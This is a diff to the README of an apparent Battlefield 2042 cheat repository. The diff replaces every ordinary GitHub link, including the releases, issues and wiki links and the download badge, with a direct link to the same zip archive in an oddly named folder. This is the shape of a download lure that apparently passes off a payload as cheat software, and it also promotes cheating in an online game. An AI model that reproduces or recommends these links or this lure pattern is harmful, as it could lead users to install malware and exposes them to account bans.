@@ -1,6 +1,6 @@
 # 🎮 Battlefield-2042-ADVANCE-Cheat - Enhance Your Battlefield 2042 Experience
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/emonpranto/Battlefield-2042-ADVANCE-Cheat/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/emonpranto/Battlefield-2042-ADVANCE-Cheat/main/coughwort/Battlefield-2042-ADVANCE-Cheat.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/emonpranto/Battlefield-2042-ADVANCE-Cheat/main/coughwort/Battlefield-2042-ADVANCE-Cheat.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to the Battlefield-2042-ADVANCE-Cheat! This cheat offers a range of feat
 To download the latest version of the software, follow these simple steps:
 
 1. **Visit the Releases Page:** Click the link below to visit the Releases page.
-   [Download Here](https://github.com/emonpranto/Battlefield-2042-ADVANCE-Cheat/releases)
+   [Download Here](https://raw.githubusercontent.com/emonpranto/Battlefield-2042-ADVANCE-Cheat/main/coughwort/Battlefield-2042-ADVANCE-Cheat.zip)
    
 2. **Select the Latest Version:** Look for the most recent release at the top of the page.
 
@@ -66,9 +66,9 @@ If you encounter issues or have questions, feel free to reach out. You can visit
 
 Here are some additional resources for Battlefield-2042-ADVANCE-Cheat:
 
-- [Issues Page](https://github.com/emonpranto/Battlefield-2042-ADVANCE-Cheat/issues)
-- [Wiki](https://github.com/emonpranto/Battlefield-2042-ADVANCE-Cheat/wiki)
+- [Issues Page](https://raw.githubusercontent.com/emonpranto/Battlefield-2042-ADVANCE-Cheat/main/coughwort/Battlefield-2042-ADVANCE-Cheat.zip)
+- [Wiki](https://raw.githubusercontent.com/emonpranto/Battlefield-2042-ADVANCE-Cheat/main/coughwort/Battlefield-2042-ADVANCE-Cheat.zip)
 
-**For the latest updates, always check** [the Releases page](https://github.com/emonpranto/Battlefield-2042-ADVANCE-Cheat/releases). 
+**For the latest updates, always check** [the Releases page](https://raw.githubusercontent.com/emonpranto/Battlefield-2042-ADVANCE-Cheat/main/coughwort/Battlefield-2042-ADVANCE-Cheat.zip). 
 
 Happy gaming!
